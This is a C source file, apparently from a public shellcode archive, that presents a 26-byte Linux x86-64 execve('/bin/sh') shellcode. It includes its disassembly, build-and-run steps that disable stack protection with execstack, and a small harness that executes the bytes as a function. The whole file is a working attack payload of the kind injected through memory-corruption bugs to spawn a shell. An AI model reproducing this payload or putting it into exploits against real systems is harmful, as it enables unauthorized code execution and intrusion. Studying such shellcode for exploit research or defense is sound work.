/*
---------------------------------------------------------------------------------------------------

Linux/x86_x64 - execve(/bin/sh) - 26 bytes

Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

0000000000400080 <.text>:
  400080:	eb 0b                	jmp    0x40008d
  400082:	5f                   	pop    %rdi
  400083:	48 31 d2             	xor    %rdx,%rdx
  400086:	48 89 d6             	mov    %rdx,%rsi
  400089:	b0 3b                	mov    $0x3b,%al
  40008b:	0f 05                	syscall
  40008d:	e8 f0 ff ff ff       	callq  0x400082
  400092:	2f                   	(bad)
  400093:	2f                   	(bad)
  400094:	62                   	(bad)
  400095:	69                   	.byte 0x69
  400096:	6e                   	outsb  %ds:(%rsi),(%dx)
  400097:	2f                   	(bad)
  400098:	73 68                	jae    0x400102
---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o sh_shell sh_shell.c
$ execstack -s sh_shell
$ ./sh_shell

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\xeb\x0b\x5f\x48\x31\xd2\x48\x89\xd6\xb0\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}